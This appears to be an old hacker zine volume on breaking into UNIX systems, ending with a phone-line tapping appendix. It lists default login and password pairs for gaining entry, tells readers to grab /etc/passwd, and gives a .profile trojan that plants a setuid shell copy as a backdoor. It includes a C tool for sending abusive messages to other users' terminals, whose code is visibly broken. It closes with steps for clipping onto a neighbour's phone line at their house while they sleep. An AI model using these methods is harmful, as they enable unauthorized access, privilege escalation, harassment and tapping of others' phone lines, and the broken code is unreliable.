  This Is the first Volume of O.F.F.H.P. I have writen and I don't know if it will be the
last (it might be the last if it is to time consumeing of tedius.) In this installment I
will cover hacking on UNIX systems.

/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/

 First thing's first UNIX and all variants Solaris, Linux, Net BSD, Free BSD, HP/UX, and
I am sure thare others I havent named are OS's much like MS-DOS and PC DOS, EXCEPT they
are multiuser 32-bit Operating systems. The shell of a UNIX system is like the C:/> in a
DOS system it is where you type in commands and run programs (although there other
windowing systems like X11 which are like Microsoft Windows and OS/2.) Scince UNIX is a
multiuser OS it means they will be diferent levels of access given to users in the system
and therefore there you will have to login and give a password. To get superuser access
you will have to login as: root but more than likely there will be a password, but all
hope is not lost there some commen usernames that come with the system like: 

Login                         Password
-----                         --------

sys                           sys, sytem, or bin
bin                           sys or bin
mountfsys                     mountfsys
adm                           adm
uucp                          uucp
nuucp                         nuucp
anon                          anon
user                          user
guest                         guest
admin                         admin

there might be some others that I did not mention it depends on the system's setup
(remember UNIX IS case sensitive.) If one of these work then your in if not good luck.
Now that your in you can pick up the "passwd" file in the /etc directory once you get
(providing it is not locked because you have low access privilages.) this you will have every username and password but there i 
still a problem
to decrypt the passwords using SUID because they won't appear on a normal text editor.
But DES encryption ain't easy to decrypt because it uses a random alphanumeric code
chosen at instlition, but the passwd file can still be usefull because you can look
for accounts that are not password protected.
Here is a Trojan Horse you cuold use to gain more power:

$ ed .profile
[some number will be here]
? a
cp /bin/sh .runme
chmod a+x .runme
chmod a+s .runme
(control -D)
? w
[new file size will be shown]
? q
$

that was an easy Trojan Horse in a C script it can be done using chmod() commands.

Something you can do to have fun is you can banner someone with rude comments like
this:

$who
crapy person tty1
root tty2
$banner Phuck You >/dev/tty1
$

that would send the stuff in the banner part to crapy person.

This is a C program that could really screw with'em:

#include <stdio.h>
#include <fcntl.h>
#include <string.h>

main(argc,argument)
int argc;
char *argument[];
{
        int handle;             
        char *pstr,*olm[80];
        char *devstar = "/dev/"; 
        int acnt = 2;
        FILE *strm;
        pstr = "";
        if (argc == 1) {
           printf("OL (oneliner) Version 1.0\n");
           printf("By CyBeR sPyDeR [O.F.F.H.P]\n");
                 printf("\nSyntax: ol tty message\n");
                 printf("Example: ol tty01 You Suck\n");
                 exit(1)
       }
        printf("OL (OneLiner) Version 1.0\n");
    printf("By CyBeR sPyDeR [O.F.F.H.P.]\n");
        if (argc == 2) {
                 strcpy(olm,"");
                 printf("\nId0t -U- pH0rG0T 2 5uppLY @ ONE LINE MESSAGE\n");
                 printf("Enter One Here =>");
                 gets(olm);
       }
       strcpy(pstr,"");
       strcat(pstr, devstr);
   strcat(pstr, argument[1]);
       pintf("Sending to: [%s]\n",pstr);
       strm = fopen(pstr,"a");
       if (strm == NULL) {
                printf("Error Writing to: %s\n,pstr);
                printf("Cause: No wirte Perms?\n");
                exit(2)
       }  
       if (argc == 2) {
          if (strcmp(logname(), "CyBeR sPyDeR") != 0) fprintf(strm, Message from (%s):
\n",logname());
          fprintf(strm, "%s\n", olm);
          fclose(strm);
          printf(Message Sent.\n");
          exit (0)
       }
    if (argc > 2){
          if (strcmp(logname(), "CyBeR sPyDeR") != 0) fprintf(strm, "Message from
(%s):\n",logname());
                 while (acnt <= argc - 1){
                         fprintf(strm, "%s",argument[acnt]);
                         acnt++;
               }
               fclose(strm);
               printf("Message sent!\n");
               exit(0)
       }                   
}

  What that will do is send one line of text to a device in /dev made writeable by you.
If you try it on someone named CyBeR sPyDeR it will notify him of it. You can supply
the argument command line, or leave a blank message and you can supply it at that time.
You HAVE TO supply a Terminal. Also, if you want to use ?, or *, or () or, [], you
can't supply a message at the command line, wait till it prompts you.

  Well, that's about all for UNIX hacknig I know it isn't much but I hope it helps.
Here are a few after thoughts: 

Plans for a BUD BOX
-------------------

A BUD BOX is like a modifided baige box. I use it mainly for modem transmissions
because all you have to bo is pull a phone line apart.

==>Matrials<==
--------------

1)Soldering Iron
2)Solder
3)A phone cord with 1 RJ11 connector on one end.
4)Some aligator clips
5)Wire stripers/cutters
--------------------------------------------------

1- Take some of the outside case off of the phone cord.
2- You should notice 4 wires (black, red, green, yellow) all you need is the 2 middle
wires which are the green and the red.
3- Solder the green and red wires to a aligator cilp.
4- Wait until it the people you want to phuck with are asleep.
5- Go to there house where the water meter and electric meter are located you will
probaly see a gray box with a bell logo on it some boxes you can just hit from the
bottom and they will open others have a bolt on them which is Ithink is 6/18 but I am
not sure. Well open the box and it will look something like this:
-------------------------------------

|                                   |
-------------------------------------
-------------------------------------

In the part that looks like an "X" there will be a red an a green wire attached to the
screws on the left side normaly. Attach the aligator clips to the corrsponding colors
for each wire if that didn't work switch them around.
